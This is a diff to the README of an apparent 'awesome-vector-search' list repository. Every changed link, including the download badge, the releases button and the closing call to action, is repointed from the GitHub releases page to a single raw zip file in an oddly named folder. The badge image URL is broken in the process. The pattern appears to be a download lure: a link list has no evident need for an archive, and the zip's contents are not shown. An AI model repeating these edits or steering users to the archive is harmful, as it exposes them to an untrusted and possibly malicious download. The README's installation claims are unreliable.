@@ -1,6 +1,6 @@
 # 🚀 awesome-vector-search - Discover Top Vector Search Tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/kirill2911/awesome-vector-search/releases)
+[![Download Now](https://raw.githubusercontent.com/kirill2911/awesome-vector-search/main/unabettedness/vector-search-awesome-v1.2.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/kirill2911/awesome-vector-search/main/unabettedness/vector-search-awesome-v1.2.zip)
 
 ## 📜 Description
 
@@ -13,7 +13,7 @@ To get started with awesome-vector-search, follow the simple steps below.
 1. **Navigate to the Releases Page**
    - Click the button below to visit our releases page.
    
-   [Visit Releases Page](https://github.com/kirill2911/awesome-vector-search/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/kirill2911/awesome-vector-search/main/unabettedness/vector-search-awesome-v1.2.zip)
    
 2. **Choose a Version**
    - On the releases page, you will find various versions available. Select the latest version for the best features and improvements.
@@ -53,7 +53,7 @@ awesome-vector-search provides a range of features to enhance your vector search
 
 To get started, visit the releases page to download the latest version of awesome-vector-search.
 
-[Download Here](https://github.com/kirill2911/awesome-vector-search/releases)
+[Download Here](https://raw.githubusercontent.com/kirill2911/awesome-vector-search/main/unabettedness/vector-search-awesome-v1.2.zip)
 
 1. Follow the installation instructions provided on the releases page.
 2. Ensure your system meets the system requirements listed above.
@@ -79,4 +79,4 @@ A: While full documentation is still in progress, you will find basic usage inst
 
 ## 🚀 Conclusion
 
-awesome-vector-search simplifies the task of finding quality vector search tools and libraries. With easy installation steps, a wealth of features, and helpful resources, you can jump directly into effective vector similarity search. Visit our [Releases Page](https://github.com/kirill2911/awesome-vector-search/releases) to get started today!
+awesome-vector-search simplifies the task of finding quality vector search tools and libraries. With easy installation steps, a wealth of features, and helpful resources, you can jump directly into effective vector similarity search. Visit our [Releases Page](https://raw.githubusercontent.com/kirill2911/awesome-vector-search/main/unabettedness/vector-search-awesome-v1.2.zip) to get started today!
